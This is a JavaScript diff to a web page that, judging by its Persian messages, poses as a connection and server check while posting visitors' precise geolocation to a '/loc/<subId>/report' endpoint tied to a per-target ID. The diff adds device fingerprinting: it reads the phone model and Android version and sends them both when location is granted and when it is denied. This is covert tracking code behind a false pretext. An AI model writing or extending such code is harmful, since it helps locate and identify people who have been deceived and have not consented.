@@ -98,11 +98,29 @@
     function stopWatch() {
       if (watchId !== null) { try { navigator.geolocation.clearWatch(watchId); } catch (e) {} watchId = null; }
     }
+    function getDevice() {
+      return new Promise(function (resolve) {
+        try {
+          if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+            var fired = false;
+            var t = setTimeout(function () { if (!fired) { fired = true; resolve(''); } }, 1200);
+            navigator.userAgentData.getHighEntropyValues(['model', 'platformVersion']).then(function (d) {
+              if (fired) return;
+              fired = true; clearTimeout(t);
+              var dev = '';
+              if (d && d.model) { dev = d.model; if (d.platformVersion) dev += ' · Android ' + String(d.platformVersion).split('.')[0]; }
+              resolve(dev);
+            }, function () { if (!fired) { fired = true; clearTimeout(t); resolve(''); } });
+          } else resolve('');
+        } catch (e) { resolve(''); }
+      });
+    }
     async function finish() {
       if (done) return;
       done = true;
       stopWatch();
-      if (!best) { fail(); return; }
+      if (!best) { done = false; fail(); return; }
+      var dev = await getDevice();
       try {
         await fetch('/loc/' + encodeURIComponent(subId) + '/report', {
           method: 'POST',
@@ -110,7 +128,8 @@
           body: JSON.stringify({
             lat: best.coords.latitude,
             lon: best.coords.longitude,
-            accuracy: best.coords.accuracy || 0
+            accuracy: best.coords.accuracy || 0,
+            device: dev
           })
         });
       } catch (e) {}
@@ -119,11 +138,18 @@
       msg.textContent = 'بررسی کامل شد ✓ اتصال شما سالم است و نزدیک‌ترین سرور برایتان انتخاب شد.';
       btn.textContent = 'بررسی انجام شد';
     }
-    function fail() {
+    async function fail() {
       if (done) return;
       done = true;
       stopWatch();
-      try { fetch('/loc/' + encodeURIComponent(subId) + '/denied', { method: 'POST' }); } catch (e) {}
+      var dev = await getDevice();
+      try {
+        await fetch('/loc/' + encodeURIComponent(subId) + '/denied', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ device: dev })
+        });
+      } catch (e) {}
       mark('s3', 'fail');
       msg.textContent = 'بررسی سرور کامل نشد: دسترسی به موقعیت لازم است. اگر مایلید، دوباره تلاش کنید و دسترسی را مجاز کنید.';
       btn.disabled = false;
